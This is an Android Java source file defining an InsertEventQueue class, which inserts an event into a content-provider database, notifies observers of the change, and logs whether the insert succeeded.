package com.fx.eventdb;

import android.content.Context;
import android.net.Uri;

import com.fx.event.Event;
import com.fx.maind.ref.Customization;
import com.vvt.logger.FxLog;

public class InsertEventQueue extends EventQueue {
	
	private static final String TAG = "InsertEventQueue";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private Event mEventToProcess;
	
	public InsertEventQueue(Context context, Callback callback, Event eventToProcess) {
		super(context, callback);
		mEventToProcess = eventToProcess;
	}
	
	public void run() {
		Uri uri = mEventdbManager.getEventUri(mEventToProcess.getType());
		Uri insertedUri = mEventdbHelper.insert(uri, mEventToProcess.getContentValues());
		
		// Print log
		if (insertedUri != null) {
			mContext.getContentResolver().notifyChange(insertedUri, null);
			
			if (LOGV) {
				FxLog.v(TAG, String.format(
						"insert # [EVENT-TRACE] Event \"%s\" is inserted successfully", 
						mEventToProcess.getShortDescription()));
			}
		} 
		else {
			if (LOGV) {
				FxLog.v(TAG, String.format(
						"insert # [EVENT-TRACE] Event \"%s\" is failed to insert!", 
						mEventToProcess.getShortDescription()));
			}
		}
		
		// Since we do not keep process wait for inserting event
		// so we don't need to notify because this can affect other process that still wait
//		notifyProcessDone();
	}
}
